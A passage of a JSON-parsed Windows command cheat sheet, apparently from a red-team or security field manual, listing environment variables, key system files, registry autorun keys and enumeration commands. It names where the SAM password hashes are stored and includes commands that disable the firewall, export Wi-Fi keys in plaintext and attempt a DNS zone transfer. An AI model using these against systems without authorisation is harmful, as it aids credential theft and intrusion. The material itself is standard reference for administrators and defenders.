      "level": 0,
      "metadata": {
        "file_paths": [
          "ncpa.cpl"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network connections manager",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "devmgmt.msc",
      "level": 0,
      "metadata": {
        "file_paths": [
          "devmgmt.msc"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Device manager editor",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "diskmgmt.msc",
      "level": 0,
      "metadata": {
        "file_paths": [
          "diskmgmt.msc"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Disk manager editor",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Environment Variables",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SYSTEMROOT%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Points to Windows folder",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Commonly: C:\\Windows)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%APPDATA%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Points to user roaming directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Commonly (C:\\Users\\<USERNAME>\\AppData\\Roaming)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%COMPUTERNAME%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "The computer hostname",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%HOMEDRIVE%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Points to default OS drive",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Commonly: C:\\)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%HOMEPATH%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Points to user directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Commonly: C:\\Users\\<USERNAME>)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%PATH%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "When a command is run without a full path (for example: ipconfig) the OS searches all file paths contained in the PATH environmental variable for this file",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%PATHEXT%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "When a command is run without an extension (for example: ipconfig) the OS searches for file matches that INCLUDE extensions from this PATHEXT list",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SYSTEMDRIVE%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Points to default OS drive",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Commonly: C:\\)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%TMP% && %TEMP%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Points to user temp folders",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Commonly: C:\\Users\\<USERNAME>\\AppData\\Local\\Temp)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%USERPROFILE%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Points to user directories",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Commonly: C:\\Users\\<USERNAME>)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%WINDIR%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Points to Windows directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Commonly: C:\\Windows)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%ALLUSERSPROFILE%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Points to Windows directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Commonly: C:\\ProgramData Windows 10+)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Key Files & Locations",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SYSTEMROOT%\\System32\\drivers\\etc\\hosts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS entries",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SYSTEMROOT%\\System32\\drivers\\etc\\networks",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network settings",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SYSTEMROOT%\\System32\\config\\SAM",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User & password hashes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SYSTEMROOT%\\repair\\SAM",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Backup copy of SAM (WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SYSTEMROOT%\\System32\\config\\RegBack\\SAM",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Backup copy of SAM",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%WINDIR%\\System32\\config\\AppEvent.Evt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "\\System32\\config\\AppEvent.Evt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Application Log (WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%WINDIR%\\System32\\config\\SecEvent.Evt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "\\System32\\config\\SecEvent.Evt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Security Log (WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%WINDIR%\\System32\\config\\SECURITY",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Security Log",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%WINDIR%\\System32\\config\\APPLICATION",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Application Log",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%ALLUSERSPROFILE%\\Start Menu\\Programs\\Startup\\",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Startup Location (WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%USERPROFILE%\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Startup Folder",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%WINDIR%\\Panther\\",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Commonly used unattend install files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%WINDIR%\\System32\\Sysprep",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Commonly used unattend install files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%WINDIR%\\kb*",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Installed patches (WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Note: All file paths marked “(WinXP)” are Windows XP only. All others are tested and working with Windows 10+.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Registry Run Keys",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "List of registry keys accessed during system boot (in load order):",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\System\\CurrentControlSet\\Services",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Start value of 0 = Kernel Drivers (Load before Kernel initiation)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start value of 2 = Auto-Start",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start value of 3 = Manual-Start",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Registry Run Keys Cont",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler (XP, NT, W2k only)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Note: Some of these keys are also reflected under HKLM\\Software\\WOW6432Node on systems running a 64-bit version of Windows.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Note: Windows Sysinternals Autoruns is an excellent utility to inspect and monitor auto-starting locations on Windows. Available at https://technet.microsoft.com/en-us/sysinternals/",
      "level": 0,
      "metadata": {
        "urls": [
          "https://technet.microsoft.com/en-us/sysinternals/"
        ],
        "file_paths": [
          "//technet.microsoft.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows System Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section details important and useful system enumeration commands that can be used to query important operating system, user, and even remote system information.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Situational Awareness",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Operating System Information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ver",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate Windows version information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic qfe list",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display hotfixes and service packs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic cpu get datawidth /format:list",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display whether 32 or 64 bit system",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dir /a c:\\",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Enumerate OS architecture - The existence of Program Files (x86) means machine is 64bit",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "systeminfo",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display OS configuration, including service pack levels",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "fsutil fsinfo drives",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display drives",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic logicaldisk get description,name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display logical drives",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "set",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display environment variables",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dir /a c:\\pagefile.sys",
      "level": 0,
      "metadata": {
        "file_paths": [
          "\\pagefile.sys"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Date of last reboot - Created date of pagefile.sys is last startup",
      "level": 0,
      "metadata": {
        "file_paths": [
          "pagefile.sys"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net share",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display shares",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net session",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display local sessions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg query HKCU\\Software\\Micros",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "oft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List user mounted shares – MUST BE RUN IN THE CONTEXT OF THE USER",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Process & Service Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tasklist /svc",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display services hosted in each process",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tasklist /FI \"USERNAME ne NT AUTHORITY\\SYSTEM\" /FI \"STATUS eq running\" /V",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display detailed information for running processes that are not running as SYSTEM",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "taskkill /F /IM <PROCESS_NAME> /T",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Force all instances of a process and child processes to terminate (terminate specific PID with /PID <PID>)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic process where name=\"<PROCESS_NAME>\" call terminate",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Terminate all instances of a process",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic process get name,executablepath,processid",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display the executable path and PID of all running processes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Class AntiVirusProduct -ErrorAction Stop",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display Anti-Virus products commonly registered as AntiVirusProduct (PowerShell command)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "runas /user:<DOMAIN>\\<USERNAME> \"<FILE_PATH> [ARGS]\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Run a file as a specific user (prompts for password)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tasklist /v | findstr \"<STRING_TO_SEARCH>\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display processes that match a certain string",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic process get processid,commandline",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display processes (including command line arguments used to launch them)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc query state= all",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display services (space after state=)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Account Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo %USERNAME%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display current user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "wmic netlogin where (name like \"%<USERNAME>%\") get Name,numberoflogons\"",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List number of times user has logged on",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net localgroup \"Administrator\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display local Administrators",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network Info & Configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ipconfig /all",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network interface information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ipconfig /displaydns",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display local DNS cache",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netstat -ano",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display all connections and ports with associated process ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netstat –anop tcp 3 >> <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Write netstat output to file every 3 seconds",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netstat –an | findstr LISTENING",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display only listening ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "route print",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display routing table",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "arp -a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display ARP table",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nslookup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "server <FQDN>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "set type=ANY",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ls -d <DOMAIN> > <FILEPATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "exit",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Attempt DNS zone transfer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nslookup –type=SRV _www._tcp.<URL>",
      "level": 0,
      "metadata": {
        "file_paths": [
          "_www._tcp"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Domain SRV lookup (other options: _ldap, _kerberos, _sip)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netsh firewall set opmode disable",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Disable firewall (*Old)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netsh wlan show profiles",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display saved wireless profiles",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netsh wlan export profile folder=. key=clear",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Export wireless profiles to include plaintext encryption keys",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netsh interface ip show interfaces",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List interface IDs/MTUs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "netsh interface ip set address name= \"<INTERFACE_NAME>\" static <NEW_IP> <NEW_SUBNET_MASK> <NEW_GATEWAY>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set IP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
